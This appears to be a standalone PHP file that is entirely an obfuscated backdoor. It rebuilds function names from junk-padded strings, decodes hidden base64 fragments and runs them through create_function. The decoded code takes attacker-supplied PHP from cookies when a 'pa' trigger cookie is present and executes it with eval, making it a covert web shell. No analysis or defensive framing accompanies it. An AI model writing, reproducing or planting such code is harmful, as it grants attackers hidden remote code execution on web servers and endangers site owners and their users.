<?php
$hkts = str_replace("y","","ystyry_yryepylyayce");
$mxzv="JdhGM9J2dhNvdW50JzskYT0kdhX0dhNPT0tJRTtpZihyZXNldCgdhkYSk9PSdwYScgJiYgJGMoJGEdhpPjMpdheyR";
$wrgj="CBqb2luKdhGFycmF5Xdh3NsaWNlKCdhRhdhLCRjKCRhdhKS0dhzKSkdhpKSdhk7ZWNdhobyAnPC8dhnLiRrLic+Jzt9";
$rzax="rdhPSdzcdh3cwcmQnO2VjdhaGdh8gJzwnLiRrLidhc+JztldmFsKdhGJhc2U2dhNF9kdhZWNvZGUod";
$czdj="hcHJlZdh19yZXBsdhYWNlKGFdhydhcmF5KCcvW1dh5cdz1cc10vJydhwnL1xzLycpLCBhcnJheSgdhnJywnKycpL";
$bcrs = $hkts("k", "", "kbkakske6k4k_dkekckodke");
$juqj = $hkts("j","","jcrjejajtje_fjujnjctjiojn");
$boxz = $juqj('', $bcrs($hkts("dh", "", $mxzv.$rzax.$czdj.$wrgj))); $boxz();